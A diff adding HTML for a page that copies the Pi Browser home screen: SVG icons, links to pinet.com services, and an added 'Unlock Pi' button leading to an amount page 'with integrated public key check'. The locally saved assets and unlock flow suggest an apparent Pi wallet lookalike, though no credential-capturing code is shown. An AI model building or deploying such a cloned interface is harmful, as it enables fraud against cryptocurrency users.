+                        <path clip-rule="evenodd" d="M263.784 512.009c0-137.08 111.126-248.206 248.206-248.206 137.079 0 248.205 111.126 248.205 248.206 0 137.079-111.126 248.205-248.205 248.205-137.08 0-248.206-111.126-248.206-248.205ZM511.99 218.675c-162.004 0-293.334 131.33-293.334 293.334 0 162.003 131.33 293.333 293.334 293.333 162.003 0 293.333-131.33 293.333-293.333 0-162.004-131.33-293.334-293.333-293.334Zm-75.955 148.073a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839Zm88.524 0a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839ZM436.035 674V478.172h-32.836v35.706h-51.261v-35.706c0-28.53 22.95-51.659 51.261-51.659h207.31v-28.868h51.262v28.868c0 28.531-22.951 51.659-51.262 51.659h-34.311v176.006L524.559 674V478.172h-36.885v176.006L436.035 674Z" fill="#f9a11b" fill-rule="evenodd"></path>
+                    </svg>
+                </div>
+                <div class="dropdown-button">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19 9l-7 7-7-7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+                    </svg>
+                </div>
+            </div>
+            <div class="pi-logo-container">
+                <div class="pi-logo">
+                    <svg fill="none" height="320" viewBox="0 0 1024 1024" width="320" xmlns="http://www.w3.org/2000/svg">
+                        <path clip-rule="evenodd" d="M263.784 512.009c0-137.08 111.126-248.206 248.206-248.206 137.079 0 248.205 111.126 248.205 248.206 0 137.079-111.126 248.205-248.205 248.205-137.08 0-248.206-111.126-248.206-248.205ZM511.99 218.675c-162.004 0-293.334 131.33-293.334 293.334 0 162.003 131.33 293.333 293.334 293.333 162.003 0 293.333-131.33 293.333-293.333 0-162.004-131.33-293.334-293.333-293.334Zm-75.955 148.073a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839Zm88.524 0a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839ZM436.035 674V478.172h-32.836v35.706h-51.261v-35.706c0-28.53 22.95-51.659 51.261-51.659h207.31v-28.868h51.262v28.868c0 28.531-22.951 51.659-51.262 51.659h-34.311v176.006L524.559 674V478.172h-36.885v176.006L436.035 674Z" fill="#fcb040" fill-rule="evenodd"></path>
+                    </svg>
+                </div>
+            </div>
+            <div class="welcome-text">Welcome to the Pi Browser</div>
+            <div class="icons-grid">
+                <!-- Unlock Pi Button -->
+                <div class="icon-card" id="unlockPiButton" onclick="handleUnlockPiClick()">
+                    <div class="icon-img-container">
+                        <img alt="Domain" src="./1_files/unlockicon.png" style="width: 38px; height: 34px;">
+                    </div>
+                    <div class="icon-label">Unlock Pi</div>
+                </div>
+                <!-- Wallet -->
+                <a class="icon-card" href="https://wallet.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" fill="none" height="40" viewBox="0 0 1024 1024" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M780.506 341.544v-11.073c0-45.478-37-82.46-82.5-82.46h-412.5c-45.49 0-82.5 36.982-82.5 82.46V701.54c0 45.478 37.01 82.46 82.5 82.46h453.75c45.5 0 82.5-36.982 82.5-82.46V412.931c0-30.46-16.617-57.114-41.25-71.387Z" fill="#fff" stroke="#724394" stroke-width="50"></path>
+                            <path d="M797 360.758v11.182c-12.154-7.037-42.642-16.564-57.693-16.564H306.605c-11.329 0-20.605-9.321-20.605-20.704 0-11.383 9.276-20.704 20.605-20.704h432.702c11.127 0 22.054 1.456 32.356 4.347 5.755 11.181 25.337 29.2 25.337 42.443ZM717.796 429.502c-65.52 0-118.8 51.8-118.8 115.5s53.28 115.5 118.8 115.5h112.2v-231h-112.2Z" fill="#724394"></path>
+                            <circle cx="706.74" cy="545.002" fill="#fff" r="49.5"></circle>
+                            <path d="M364.714 432.771c0-1.806 1.477-3.271 3.3-3.271h31.9c1.822 0 3.3 1.465 3.3 3.271v25.082c0 1.807-1.478 3.271-3.3 3.271h-31.9c-1.823 0-3.3-1.464-3.3-3.271v-25.082ZM430.714 432.771c0-1.806 1.477-3.271 3.3-3.271h31.9c1.822 0 3.3 1.465 3.3 3.271v25.082c0 1.807-1.478 3.271-3.3 3.271h-31.9c-1.823 0-3.3-1.464-3.3-3.271v-25.082Z" fill="#724394"></path>
+                            <path d="M364.714 515.357V660.5l38.5-14.692V515.357h27.5V660.5l38.5-14.692V515.357h25.581c21.107 0 38.219-17.143 38.219-38.289v-21.396h-38.219v21.396H340.233c-21.108 0-38.219 17.143-38.219 38.289v26.464h38.219v-26.464h24.481Z" fill="#724394"></path>
+                            <defs>
+                                <clippath id="a"><path d="M177.5 182h669v660h-669z" fill="#fff"></path></clippath>
+                            </defs>
+                        </svg>
+                    </div>
+                    <div class="icon-label">Wallet</div>
+                </a>
+                <!-- Brainstorm -->
+                <a class="icon-card" href="https://brainstorm.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" fill="none" height="40" viewBox="0 0 1024 1024" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M512 228.634v-27.645M804.172 518.893h27.826M192 518.893h27.826M275.469 311.564l27.826 27.644M748.516 311.564l-27.826 27.644M748.516 753.876l-27.826-27.644M275.469 753.876l27.826-27.644" stroke="#724394" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="50"></path>
+                            <path d="M489.832 340.39c-149.578 15.786-222.524 221.223-99.082 320.238 41.559 33.336 53.396 49.84 53.396 102.064 0 33.306 30.366 60.305 67.826 60.305 37.46 0 67.826-26.999 67.826-60.305 0-51.653 12.607-69.236 53.627-102.249C773.169 547.966 660.018 322.43 489.832 340.39Z" fill="#fff" stroke="#724394" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" stroke-width="50"></path>
+                            <path d="M468.967 441.143a2.68 2.68 0 0 1 2.689-2.669h25.995a2.68 2.68 0 0 1 2.689 2.669v20.466a2.68 2.68 0 0 1-2.689 2.669h-25.995a2.68 2.68 0 0 1-2.689-2.669v-20.466ZM522.749 441.143a2.68 2.68 0 0 1 2.689-2.669h25.994a2.68 2.68 0 0 1 2.69 2.669v20.466a2.68 2.68 0 0 1-2.69 2.669h-25.994a2.68 2.68 0 0 1-2.689-2.669v-20.466Z" fill="#724394"></path>
+                            <path d="M468.967 508.529v118.43l31.373-11.988V508.529h22.409v118.43l31.373-11.988V508.529h20.845c17.2 0 31.143-13.987 31.143-31.241v-17.459h-31.143v17.459H449.019c-17.201 0-31.144 13.987-31.144 31.241v21.594h31.144v-21.594h19.948Z" fill="#724394"></path>
+                        </svg>
+                    </div>
+                    <div class="icon-label">Brainstorm</div>
+                </a>
+                <!-- Mine -->
+                <a class="icon-card" href="https://mine.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" fill="none" height="40" viewBox="0 0 1024 1024" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="512.012" cy="511.976" fill="#fff" r="273.778"></circle>
+                            <path clip-rule="evenodd" d="M263.784 512.009c0-137.08 111.126-248.206 248.206-248.206 137.079 0 248.205 111.126 248.205 248.206 0 137.079-111.126 248.205-248.205 248.205-137.08 0-248.206-111.126-248.206-248.205ZM511.99 218.675c-162.004 0-293.334 131.33-293.334 293.334 0 162.003 131.33 293.333 293.334 293.333 162.003 0 293.333-131.33 293.333-293.333 0-162.004-131.33-293.334-293.333-293.334Zm-75.955 148.073a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839Zm88.524 0a4.42 4.42 0 0 1 4.426-4.414h42.787a4.42 4.42 0 0 1 4.426 4.414v33.839a4.42 4.42 0 0 1-4.426 4.414h-42.787a4.42 4.42 0 0 1-4.426-4.414v-33.839ZM436.035 674V478.172h-32.836v35.706h-51.261v-35.706c0-28.53 22.95-51.659 51.261-51.659h207.31v-28.868h51.262v28.868c0 28.531-22.951 51.659-51.262 51.659h-34.311v176.006L524.559 674V478.172h-36.885v176.006L436.035 674Z" fill="#724394" fill-rule="evenodd"></path>
+                        </svg>
+                    </div>
+                    <div class="icon-label">Mine</div>
+                </a>
+                <!-- Blockchain -->
+                <a class="icon-card" href="https://blockexplorer.minepi.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" fill="none" height="40" viewBox="0 0 1024 1024" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <path clip-rule="evenodd" d="M337.324 512.003c0-96.477 78.212-174.687 174.69-174.687 96.479 0 174.69 78.21 174.69 174.687 0 96.477-78.211 174.688-174.69 174.688-96.478 0-174.69-78.211-174.69-174.688Zm174.69-206.448c-114.02 0-206.452 92.43-206.452 206.448 0 114.019 92.432 206.449 206.452 206.449s206.452-92.43 206.452-206.449c0-114.018-92.432-206.448-206.452-206.448Zm-53.466 104.216a3.111 3.111 0 0 1 3.116-3.107h30.113a3.11 3.11 0 0 1 3.115 3.107v23.816a3.11 3.11 0 0 1-3.115 3.107h-30.113a3.111 3.111 0 0 1-3.116-3.107v-23.816Zm62.304 0a3.112 3.112 0 0 1 3.117-3.107h30.112a3.112 3.112 0 0 1 3.117 3.107v23.816a3.112 3.112 0 0 1-3.117 3.107h-30.112a3.112 3.112 0 0 1-3.117-3.107v-23.816Zm-62.304 216.245V488.191h-23.11v25.13h-36.079v-25.13c0-20.079 16.153-36.357 36.079-36.357h145.907v-20.318h36.079v20.318c0 20.08-16.153 36.357-36.079 36.357h-24.147v123.874l-36.346 13.951V488.191h-25.96v123.874l-36.344 13.951ZM844.428 512.002c0-90.046 72.997-163.042 163.042-163.042 90.05 0 163.04 72.996 163.04 163.042 0 90.045-72.99 163.041-163.04 163.041-90.045 0-163.042-72.996-163.042-163.041Zm163.042-192.686c-106.417 0-192.687 86.269-192.687 192.686s86.27 192.685 192.687 192.685c106.42 0 192.69-86.268 192.69-192.685s-86.27-192.686-192.69-192.686Zm-40.9 97.271a2.904 2.904 0 0 1 2.908-2.899h28.106a2.902 2.902 0 0 1 2.906 2.899v22.229c0 1.601-1.3 2.899-2.906 2.899h-28.106a2.904 2.904 0 0 1-2.908-2.899v-22.229Zm58.15 0c0-1.601 1.3-2.899 2.91-2.899h28.1c1.61 0 2.91 1.298 2.91 2.899v22.229c0 1.601-1.3 2.899-2.91 2.899h-28.1a2.903 2.903 0 0 1-2.91-2.899v-22.229Zm-58.15 201.829V489.78H911.327c0-18.741 15.076-33.934 33.674-33.934h136.179v-18.963h33.67v18.963c0 18.741-15.07 33.934-33.67 33.934h-22.54v115.614l-33.92 13.022V489.78h-24.23v115.614l-33.92 13.022ZM-158.174 511.997c0-96.477 78.212-174.687 174.69-174.687 96.479 0 174.69 78.21 174.69 174.687 0 96.478-78.211 174.688-174.69 174.688-96.478 0-174.69-78.21-174.69-174.688Zm174.69-206.448c-114.02 0-206.452 92.43-206.452 206.448 0 114.019 92.433 206.449 206.453 206.449 114.019 0 206.451-92.43 206.451-206.449 0-114.018-92.432-206.448-206.451-206.448Zm-53.452 104.213a3.111 3.111 0 0 1 3.115-3.106h30.114a3.11 3.11 0 0 1 3.115 3.106v23.817a3.11 3.11 0 0 1-3.115 3.106h-30.114a3.11 3.11 0 0 1-3.115-3.106v-23.817Zm62.304 0a3.11 3.11 0 0 1 3.115-3.106h30.114a3.11 3.11 0 0 1 3.115 3.106v23.817a3.11 3.11 0 0 1-3.115 3.106H28.483a3.11 3.11 0 0 1-3.115-3.106v-23.817Zm-62.304 216.246V488.183h-23.11v25.13h-36.079v-25.13c0-20.08 16.153-36.358 36.079-36.358H85.86v-20.317h36.078v20.317c0 20.08-16.153 36.358-36.078 36.358H61.712v123.873l-36.344 13.952V488.183H-.592v123.873l-36.344 13.952Z" fill="#724394" fill-rule="evenodd"></path>
+                            <path d="M150.598 511.992h210.823M662.598 511.992h210.823" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-width="90.353"></path>
+                            <path d="M150.598 511.992h210.823M662.598 511.992h210.823" stroke="#724394" stroke-linecap="round" stroke-linejoin="round" stroke-width="50"></path>
+                            <defs>
+                                <clippath id="a"><path d="M0 0h1024v1024H0z" fill="#fff"></path></clippath>
+                            </defs>
+                        </svg>
+                    </div>
+                    <div class="icon-label">Blockchain</div>
+                </a>
+                <!-- Develop -->
+                <a class="icon-card" href="https://develop.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" fill="none" height="40" viewBox="0 0 1024 1024" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <rect fill="#724394" height="486.957" rx="27.826" width="640" x="192" y="219.828"></rect>
+                            <path clip-rule="evenodd" d="M568 687H456v61.522h-69.234v55.653H637.2v-55.653H568V687Z" fill="#724394" fill-rule="evenodd"></path>
+                            <circle cx="512" cy="651.304" fill="#fff" r="28"></circle>
+                            <path d="M247.641 275h528.696v320H247.641z" fill="#fff"></path>
+                            <path clip-rule="evenodd" d="M374.136 499.411c-7.83 7.441-20.538 7.454-28.385.028l-53.857-50.966c-3.774-3.57-5.894-8.417-5.894-13.472s2.12-9.902 5.893-13.473l53.858-50.967c7.846-7.425 20.555-7.413 28.385.028 7.83 7.44 7.817 19.491-.029 26.917L334.486 435l39.62 37.494c7.847 7.425 7.86 19.476.03 26.917ZM649.864 499.411c7.83 7.441 20.538 7.454 28.385.028l53.857-50.966c3.774-3.57 5.894-8.417 5.894-13.472s-2.12-9.902-5.893-13.473l-53.858-50.967c-7.846-7.425-20.555-7.413-28.385.028-7.83 7.44-7.817 19.491.029 26.917L689.514 435l-39.62 37.494c-7.847 7.425-7.86 19.476-.03 26.917Z" fill="#724394" fill-rule="evenodd"></path>
+                            <path d="M469.029 343.663a2.674 2.674 0 0 1 2.685-2.663h25.962c1.483 0 2.686 1.192 2.686 2.663v20.412c0 1.47-1.203 2.663-2.686 2.663h-25.962c-1.483 0-2.685-1.193-2.685-2.663v-20.412ZM522.743 343.663c0-1.471 1.202-2.663 2.686-2.663h25.961c1.484 0 2.686 1.192 2.686 2.663v20.412c0 1.47-1.202 2.663-2.686 2.663h-25.961c-1.484 0-2.686-1.193-2.686-2.663v-20.412Z" fill="#724394"></path>
+                            <path d="M469.029 410.875V529l31.333-11.957V410.875h22.381V529l31.333-11.957V410.875h20.819c17.179 0 31.105-13.952 31.105-31.161V362.3h-31.105v17.414h-125.79c-17.179 0-31.105 13.951-31.105 31.161v21.538h31.105v-21.538h19.924Z" fill="#724394"></path>
+                        </svg>
+                    </div>
+                    <div class="icon-label">Develop</div>
+                </a>
+                <!-- KYC -->
+                <a class="icon-card" href="https://kyc.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" fill="none" height="40" viewBox="0 0 1024 1024" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M760.972 302.586H220.769c-20.946 0-37.925 16.971-37.925 37.906v338.582c0 20.935 16.979 37.906 37.925 37.906h540.203c20.945 0 37.925-16.971 37.925-37.906V340.492c0-20.935-16.98-37.906-37.925-37.906Z" fill="#fff" stroke="#724394" stroke-linecap="round" stroke-linejoin="round" stroke-width="45.335"></path>
+                            <path d="M757.786 584.687H486.698c-4.691 0-8.495 3.801-8.495 8.491v19.18c0 4.69 3.804 8.491 8.495 8.491h271.088a8.492 8.492 0 0 0 8.495-8.491v-19.18a8.492 8.492 0 0 0-8.495-8.491ZM757.773 489.349H491.995c-4.692 0-8.495 3.802-8.495 8.491v19.181c0 4.689 3.803 8.491 8.495 8.491h265.778c4.692 0 8.495-3.802 8.495-8.491V497.84c0-4.689-3.803-8.491-8.495-8.491ZM757.773 394.089H491.995c-4.692 0-8.495 3.802-8.495 8.491v19.181a8.492 8.492 0 0 0 8.495 8.491h265.778a8.492 8.492 0 0 0 8.495-8.491V402.58c0-4.689-3.803-8.491-8.495-8.491ZM338.619 498.487c36.654 0 66.368-29.7 66.368-66.337 0-36.636-29.714-66.336-66.368-66.336-36.655 0-66.369 29.7-66.369 66.336 0 36.637 29.714 66.337 66.369 66.337ZM338.545 528.893c50.061 0 90.716 40.635 90.716 90.672v27.444c0 3.715-3.034 6.748-6.751 6.748H254.579c-3.717 0-6.751-3.033-6.751-6.748v-27.444c0-50.037 40.656-90.672 90.717-90.672Z" fill="#724394"></path>
+                            <path d="M775.949 796.683c78.916-22.038 124.678-105.056 102.212-185.426-22.465-80.37-104.652-127.657-183.568-105.619-78.916 22.038-124.678 105.056-102.212 185.425 22.466 80.37 104.652 127.658 183.568 105.62Z" fill="#fff" stroke="#724394" stroke-linecap="round" stroke-linejoin="round" stroke-width="30.224"></path>
+                            <path d="M691.078 572.261c0-1.296 1.019-2.406 2.315-2.406h23.052c1.296-.185 2.407.925 2.407 2.313l.278 18.6c0 1.295-1.018 2.406-2.315 2.406h-23.052c-1.296.185-2.407-.926-2.407-2.314l-.278-18.599ZM738.75 571.984c0-1.295 1.018-2.406 2.315-2.406h23.052c1.296-.185 2.407.926 2.407 2.314l.278 18.599c0 1.296-1.019 2.406-2.315 2.406h-23.052c-1.296.185-2.407-.925-2.407-2.313l-.278-18.6Z" fill="#724394"></path>
+                            <path d="m692.003 633.429 1.481 96.514 27.96 11.012-1.667-107.619h19.905l1.481 96.422 27.96 11.012-1.667-107.619h18.516c15.276-.185 27.404-12.955 27.219-28.686l-.278-15.823-27.589.185.278 15.823-111.745.648c-15.275 0-27.403 12.862-27.218 28.501l.278 19.617 27.588-.185-.277-19.617h17.683l.092-.185Z" fill="#724394"></path>
+                            <path clip-rule="evenodd" d="M733.211 515.441c-73.694.463-132.576 61.536-131.372 136.398 1.204 74.953 61.844 135.286 135.63 134.824 73.694-.463 132.575-61.536 131.372-136.398-1.204-74.953-61.844-135.286-135.63-134.824ZM577.583 652.024c-1.389-88.557 68.139-160.734 155.257-161.197 87.118-.463 158.868 70.79 160.257 159.346 1.388 88.556-68.139 160.734-155.257 161.197-87.119.555-158.868-70.79-160.257-159.346Z" fill="#724394" fill-rule="evenodd"></path>
+                        </svg>
+                    </div>
+                    <div class="icon-label">KYC</div>
+                </a>
+                <!-- Chat -->
+                <a class="icon-card" href="https://chat.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" fill="none" height="40" viewBox="0 0 1024 1024" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M224 284.632C224 251.146 251.146 224 284.632 224h454.736C772.854 224 800 251.146 800 284.632V772l-90.947-91.333H284.632c-33.486 0-60.632-27.146-60.632-60.632V284.632Z" fill="#fff" stroke="#724394" stroke-linejoin="round" stroke-width="50"></path>
+                            <path d="M449.829 327.852c0-2.127 1.739-3.852 3.885-3.852h37.562c2.146 0 3.886 1.725 3.886 3.852v29.533c0 2.128-1.74 3.852-3.886 3.852h-37.562c-2.146 0-3.885-1.724-3.885-3.852v-29.533ZM527.543 327.852c0-2.127 1.74-3.852 3.886-3.852h37.561c2.147 0 3.886 1.725 3.886 3.852v29.533c0 2.128-1.739 3.852-3.886 3.852h-37.561c-2.146 0-3.886-1.724-3.886-3.852v-29.533Z" fill="#724394"></path>
+                            <path d="M449.829 425.095V596l45.333-17.3V425.095h32.381V596l45.333-17.3V425.095h30.122c24.854 0 45.002-20.184 45.002-45.084v-25.194h-45.002v25.194H421.002c-24.854 0-45.002 20.185-45.002 45.084v31.162h45.002v-31.162h28.827Z" fill="#724394"></path>
+                        </svg>
+                    </div>
+                    <div class="icon-label">Chat</div>
+                </a>
+                <!-- Profiles -->
+                <a class="icon-card" href="https://profiles.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" height="40" viewBox="0 0 2048 2048" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M1012 447h28l43 3 28 3 29 5 36 9 35 11 26 10 30 13 17 8 22 12 19 11 30 20 14 10 16 13 13 10 10 9 8 7 10 9 19 19 7 8 11 13 22 28 13 18 15 23 13 22 13 24 13 28 12 31 11 33 8 30 8 38 4 27 3 35v69l-3 40-4 28-9 41-9 31-12 35-19 44-15 29-14 23-10 15-10 16-14 18-10 12-9 11-13 15-12 13-14 14-8 7-10 9-13 10-12 10-16 12-15 11-19 12-25 15-27 14-17 8-32 13-50 16-30 7-30 6-30 4-23 2-20 1h-51l-31-2-28-3-24-4-37-9-26-8-26-9-29-12-29-13-22-12-23-13-28-19-16-12-16-13-11-9-14-12-31-31-9-11-13-15-11-14-9-11-14-20-14-22-10-17-13-24-14-29-12-30-9-27-10-34-7-34-5-31-3-29-1-17v-54l2-34 4-33 3-19 10-40 7-23 10-29 13-30 9-20 10-20 20-34 16-24 13-17 10-13 7-9 14-17 9-10 2-3h2l2-4 13-13 8-7 13-11 14-11 17-14 18-13 15-10 17-11 24-14 19-10 33-15 45-16 32-9 36-8 24-4 37-4zm-22 68-33 3-37 6-27 6-29 9-20 7-29 12-16 8-29 15-21 13-20 14-18 13-13 11-10 8-15 14-8 7v2l-4 2-8 8-7 8-11 13-8 10-9 11-10 13-11 18-10 16-9 15-12 23-13 29-10 25-14 45-6 28-5 33-3 28-1 18v38l2 28 5 36 5 26 8 31 12 36 11 27 12 25 12 22 12 21 20 30 6 5 3 4 4-1 10-21 5-9 10-21 8-14 7-12 9-14 8-11 14-18 7-8 8-10 10-11v-2l3-1v-2l4-2 9-9 10-8 12-10 11-9 15-11 19-12 17-10 22-12 30-13 6-3-6-7-14-9-9-9-6-5-7-8-13-17-9-13-9-15-8-16-10-22-6-17-5-17-3-17-2-27 1-31 4-26 9-32 10-23 13-26 14-21 11-14 9-10 11-11 17-13 10-7 15-9 23-12 21-9 21-6 23-4 23-2h33l24 2 22 4 26 8 18 8 17 9 18 11 16 12 11 10 8 7 13 14 14 19 8 13 10 18 9 20 8 24 6 24 3 20 1 10v34l-3 24-6 26-6 20-11 24-10 19-14 19-10 13-12 14-11 11-10 6-17 9v2l26 12 23 11 29 16 16 10 12 8 13 10 13 11 10 8 10 9 12 11 7 8 10 11 13 17 13 18 14 22 11 20 9 16 8 19 6 17 2 3 4-2 9-9 9-13 7-11 10-15 8-14 12-22 9-19 14-34 9-29 6-22 7-33 4-28 3-32 1-35-2-43-4-34-8-39-8-29-12-35-12-28-8-17-10-19-17-29-14-20-10-13-8-10-14-17-10-11-7-8-19-19-8-7-16-13-19-14-14-10-22-14-20-12-16-9-28-13-33-13-22-7-38-10-25-5-23-3-36-3zm19 176-27 4-23 6-16 7-19 11-14 10-14 13-5 4-7 8-7 9-10 16-11 21-6 15-5 15-4 20-1 8v30l3 23 5 19 8 20 12 23 12 17 13 15 11 9 12 9 19 12 19 9 15 6 30 6 17 2h18l22-3 25-7 13-5 18-8 19-12 13-10 13-13 11-12 11-16 6-10 11-23 5-17 4-24 1-13v-24l-2-19-5-23-6-16-10-20-10-16-11-14-19-19-13-10-16-10-25-12-15-5-14-3-25-3zm-15 434-26 3-30 6-25 7-27 10-33 16-19 12-15 10-17 13-17 14-13 12-12 14-7 8-11 14-3 3v2h-2l-14 22-16 29-13 28-10 25-6 19v6l7 6 11 9 18 14 12 9 21 14 24 15 24 13 27 13 27 11 27 9 42 11 31 5 33 3 19 1h51l35-3 29-4 28-6 30-8 34-12 27-12 38-19 28-17 17-12 16-12 17-13 10-9 4-5 2-8-3-12-7-21-5-13-14-29-12-21-12-19-12-16-9-11-9-10-7-8-11-11-11-9-13-11-14-10-15-10-24-14-15-8-38-16-23-7-23-5-30-4-13-1z" fill="#724394"></path>
+                            <path d="m1128 1222 37 3 7 3 2 6v10l-4 21-5 12-11 12-9 6-14 4-14 2h-27v26l-1 138-5 5-23 12-12 3-7-1-1-2v-56l-1-101-1-19-4-4-4-1h-18l-7 3-1 162-4 4-17 8-9 4-4 1h-14l-2-3v-172l-2-5-4-3-3-1h-10l-7 3-1 10v10l-3 7-4 5-8 2h-26l-7-2-3-4-2-9v-20l4-17 6-12 9-11 8-6 8-2 11-1 48-1h63l80-1 8-3 2-3 2-14zM982 1190h21l2 5 1 11v21l-2 1-10 1h-31l-6-2-2-3v-25l3-7 2-1z" fill="#724394"></path>
+                            <path d="M1046 1189h17l18 1 5 3 2 5 1 15v14l-5 3h-38l-5-3v-24l2-10 1-3z" fill="#724394"></path>
+                        </svg>
+                    </div>
+                    <div class="icon-label">Profiles</div>
+                </a>
+                <!-- Fireside -->
+                <a class="icon-card" href="https://fireside.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <svg class="w-full h-full text-primary-500 transition duration-150 group-hover:text-primary-400 group-focus:text-primary-400" fill="none" height="40" viewBox="0 0 1024 1024" width="40" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M656.135 525.064c26.234-204.379-88.638-335.168-152.676-376.434 7.18 32.717 5.956 90.965-25.807 148.594-53.943 97.874-178.906 145.798-204.327 254.623-5.649 24.183-9.082 51.277-9.082 81.257 0 167.702 156.411 242.236 257.617 242.236 272.982 0 263.752-310.56 202.414-428.572-9.364 42.673-29.155 72.527-47.053 91.001-9.578 9.886-22.838.947-21.086-12.705Z" fill="#724394"></path>
+                            <path d="M557.758 544h-92.516c-3.758 0-7.372.142-10.841.569C415.515 547.84 396 570.451 396 612.119v56.885c0 56.884 23.129 68.119 69.242 68.119h5.782c3.181 0 7.373 2.133 9.252 4.55l17.347 22.754c7.661 10.097 20.093 10.097 27.754 0l17.347-22.754c2.168-2.844 5.638-4.55 9.252-4.55h5.782c42.355 0 65.339-19.057 68.664-57.454.433-3.413.578-6.968.578-10.665v-56.885C627 566.754 603.871 544 557.758 544ZM461.05 657.769c-8.095 0-14.456-6.4-14.456-14.221 0-7.822 6.505-14.221 14.456-14.221s14.456 6.399 14.456 14.221c0 7.821-6.505 14.221-14.456 14.221Zm50.45 0c-8.095 0-14.456-6.4-14.456-14.221 0-7.822 6.505-14.221 14.456-14.221s14.456 6.399 14.456 14.221c0 7.821-6.361 14.221-14.456 14.221Zm50.594 0c-8.095 0-14.455-6.4-14.455-14.221 0-7.822 6.505-14.221 14.455-14.221 7.951 0 14.456 6.399 14.456 14.221 0 7.821-6.505 14.221-14.456 14.221Z" fill="#fff"></path>
+                        </svg>
+                    </div>
+                    <div class="icon-label">Fireside</div>
+                </a>
+                <!-- Domain -->
+                <a class="icon-card" href="https://domain.pinet.com/" target="_blank">
+                    <div class="icon-img-container">
+                        <img alt="Domain" src="./1_files/domain.png" style="width: 38px; height: 34px;">
+                    </div>
+                    <div class="icon-label">Domain</div>
+                </a>
+            </div>
+            <!-- Explore Ecosystem Button -->
+            <a href="https://ecosystem.pinet.com/" style="display: flex; justify-content: center; margin: 0.2rem auto 0;" target="_blank">
+                <img alt="Explore the ecosystem" src="./1_files/ecosystem.png" style="width: 100%; max-width: 350px; height: auto; display: block; border: none; background: none; padding: 0;">
+            </a>
+            <!-- Empty space at bottom -->
+            <div style="height: 2rem;"></div>
+        </div>
+        <!-- Pi Amount Page with integrated public key check -->
+        <div class="page" id="amountPage" style="transform: translateX(0px); visibility: visible; opacity: 1;">
+            <div class="header">
+                <div class="back-button" id="backToCheckFromAmount" onclick="navigateToHome()">
+                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M15 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"></path>
+                    </svg>
+                </div>
+                <div class="header-title">
+                    <svg class="header-unlock-icon" fill="none" stroke="var(--pi-gold)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <rect height="11" rx="2" ry="2" width="18" x="3" y="11"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v2"></path>
+                    </svg>
+                    Unlock Pi
+                    <svg class="header-pi-logo" fill="none" height="26" viewBox="0 0 1024 1024" width="26" xmlns="http://www.w3.org/2000/svg">
